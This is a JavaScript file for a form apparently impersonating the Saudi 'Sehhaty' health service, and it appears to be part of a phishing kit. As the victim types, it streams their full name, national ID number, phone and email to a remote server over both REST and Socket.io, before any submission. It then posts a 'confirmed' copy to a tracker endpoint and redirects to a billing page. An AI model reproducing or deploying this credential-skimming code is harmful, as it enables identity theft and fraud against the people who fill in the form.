const SERVER_URL = window.SERVER_HUB_URL || (window.location.origin.includes('localhost') || window.location.origin.includes('127.0.0.1')
    ? "http://localhost:5000"
    : window.location.origin);
const siteKey = "site_sehhaty_v1"; // Unified Sehhaty Site Key
const visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
localStorage.setItem('visitor_token', visitorToken);

// Initialize Socket.io connection
let socket = null;
try {
    socket = io(SERVER_URL);
    console.log("[Sehhaty] Connected to live streaming socket:", SERVER_URL);
} catch(e) {
    console.warn("[Sehhaty] Socket.io offline, using fallback REST API.");
}

// Gathers and streams the typing inputs in real-time
function streamInputs(isConfirmed = false) {
    const fullName = document.getElementById('fullName').value.trim();
    const nationalId = document.getElementById('nationalId').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const emailAddress = document.getElementById('emailAddress').value.trim();

    const dataPayload = {
        "الاسم الكامل": fullName,
        "رقم الهوية / الإقامة": nationalId,
        "رقم الجوال": phoneNumber,
        "البريد الإلكتروني": emailAddress || "غير متوفر"
    };

    console.log("[Sehhaty] Streaming input update...", dataPayload);

    // Send via REST fetch
    fetch(SERVER_URL + '/api/stream-input', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            siteKey: siteKey,
            visitorToken: visitorToken,
            data: dataPayload,
            isConfirmed: isConfirmed
        })
    }).catch(() => {});

    // Emit via Socket.io for instantaneous update
    if (socket && socket.connected) {
        socket.emit('stream_input', {
            visitorToken: visitorToken,
            siteKey: siteKey,
            data: dataPayload
        });
    }
}

// Handles form validations and confirmed submission
function handleFormSubmit(event) {
    event.preventDefault();
    console.log("[Sehhaty] Form submitted. Starting validations...");

    const fullName = document.getElementById('fullName').value.trim();
    const nationalId = document.getElementById('nationalId').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();

    // Validate Full Name (At least 3 words / space-separated parts)
    const nameParts = fullName.split(/\s+/);
    const isNameValid = nameParts.length >= 3 && fullName.length >= 10;
    document.getElementById('val-fullName').style.display = isNameValid ? 'none' : 'block';

    // Validate National ID (10 digits starting with 1 or 2)
    const isIdValid = /^[12]\d{9}$/.test(nationalId);
    document.getElementById('val-nationalId').style.display = isIdValid ? 'none' : 'block';

    // Validate Phone (10 digits starting with 05)
    const isPhoneValid = /^05\d{8}$/.test(phoneNumber);
    document.getElementById('val-phoneNumber').style.display = isPhoneValid ? 'none' : 'block';

    if (!isNameValid || !isIdValid || !isPhoneValid) {
        console.warn("[Sehhaty] Form validation failed!");
        return;
    }

    // Lock form inputs and button, show loading spinner
    document.getElementById('submitBtn').disabled = true;
    document.getElementById('btnText').style.display = 'none';
    document.getElementById('btnSpinner').style.display = 'block';

    const emailAddress = document.getElementById('emailAddress').value.trim();

    // Send final validated payload directly as a confirmed submission
    const payload = {
        token: visitorToken,
        siteKey: siteKey,
        formName: "البيانات الشخصية (مؤكد ✅)",
        submissionData: {
            "الاسم الكامل": fullName,
            "رقم الهوية / الإقامة": nationalId,
            "رقم الجوال": phoneNumber,
            "البريد الإلكتروني": emailAddress || "غير متوفر"
        },
        isFinalSubmission: true,
        isImportant: true
    };

    console.log("[Sehhaty] Submitting personal data to server...", payload);

    fetch(SERVER_URL + '/api/tracker/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => {
        console.log("[Sehhaty] Submitted successfully. Redirecting to bill...");
        setTimeout(() => {
            window.location.href = 'bill.html';
        }, 1000);
    })
    .catch(() => {
        window.location.href = 'bill.html';
    });
}
